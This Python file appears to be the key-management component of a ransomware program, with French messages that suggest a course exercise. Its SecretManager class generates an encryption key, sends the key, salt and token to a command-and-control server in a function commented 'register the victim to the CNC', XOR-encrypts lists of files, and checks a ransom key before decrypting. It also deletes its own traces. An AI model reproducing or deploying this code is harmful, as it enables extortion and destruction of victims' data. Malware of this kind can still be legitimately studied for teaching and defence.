from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # Derive the key from salt and from the key
        kdf = PBKDF2HMAC(
            algorithm = hashes.SHA256(), 
            length = self.KEY_LENGTH, 
            salt = salt, 
            iterations = self.ITERATION,
            backend = default_backend()
        )
        # derive the key
        der_key = kdf.derive(key)
        return der_key


    def create(self)->Tuple[bytes, bytes, bytes]:
        #Generate the salt, the key and the token
        salt = secrets.token_bytes(self.SALT_LENGTH)
        key = secrets.token_bytes(self.KEY_LENGTH)
        token = self.do_derivation(salt, key) 
        return salt, key, token


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")
    

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        #Creation of the url
        url = f"http://{self._remote_host_port}/new"
        #Creation of the dictionnary and send them to base64
        data = { 
        "token" : self.bin_to_b64(token),
        "salt" : self.bin_to_b64(salt),
        "key" : self.bin_to_b64(key)
        }
        response = requests.post(url, json=data) 
        #Verification
        if response.status_code != 200:
            self._log.error(f" Failed : {response.text}")
        else:
            self._log.info(" Succeed ")

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        #Verification of self._token.bin
        if os.path.exists(os.path.join(self._path, "token.bin")) or os.path.exists(os.path.join(self._path, "salt.bin")):
            raise FileExistsError("Les données de chiffrement existent déjà")

        #Creation of the elements
        self._salt, self._key, self._token = self.create()

        #Save the elements
        os.makedirs(self._path, exist_ok = True)
        with open(os.path.join(self._path, "salt.bin"), "wb") as salt_f:
            salt_f.write(self._salt)
        with open(os.path.join(self._path, "token.bin"), "wb") as token_f:
            token_f.write(self._token)
        
        #Send the data to CNC
        self.post_new(self._salt, self._key, self._token)

    def load(self)->None:
        # function to load crypto data
        #Load the data (salt and token)
        salt_path = os.path.join(self._path, "salt.bin")
        token_path = os.path.join(self._path, "token.bin")

        if os.path.exists(salt_path) and os.path.exists(token_path):
            with open(salt_path, "rb") as salt_f:
                self._salt = salt_f.read()
            with open(token_path, "rb") as token_f:
                self._token = token_f.read()
        else:
            self._log.info(" NOT FOUND ")

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        #Verification of the key
        token = self.do_derivation(self._salt, candidate_key)
        return token == self._token
        
        #Compared the derived key and the stored key
        if self._key == (self.do_derivation(self._salt, candidate_key)):
            return True
        else:
            return False
        

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        #Decode the base64 key
        decode_key = base64.b64decode(b64_key)
        if self.check_key(decode_key):
            self._key = decode_key
            self._log.info(" Succeed ")
        else:
            raise ValueError(" Failed ")

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        #Hash the token to sha256 and convert it to hex
        hashed_token = sha256(self._token).hexdigest()
        return hashed_token

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        #self._log.info(files)
        for f_path in files:
            try:
                xorfile(f_path, self._key)
                self._log.info(f" Coding of {f_path} succeed ")
            except Exception as E:
                self._log.error(f" Failed coding {f_path}: {E}")

    def clean(self):
        # remove crypto data from the target
        #Remove the files
        salt_path = os.path.join(self._path, "salt.bin")
        token_path = os.path.join(self._path, "token.bin")

        try:  
            if os.path.exists(salt_path):
                os.remove(salt_path) 
                self._log.info(" Files deleted ")
        
        except Exception as E:
            self._log.error(f"Error while deleting : {E}")
            raise
            
        try:
            if os.path.exists(token_path):
                os.remove(token_path)
                self._log.info(" token files deleted ")
    
        except Exception as E:
            self._log.error(f"Erreur pendant la suppression du fichier de jeton: {E}")
            raise 
            
        #Clear in memory data
        self._salt = None
        self._key = None
        self._token = None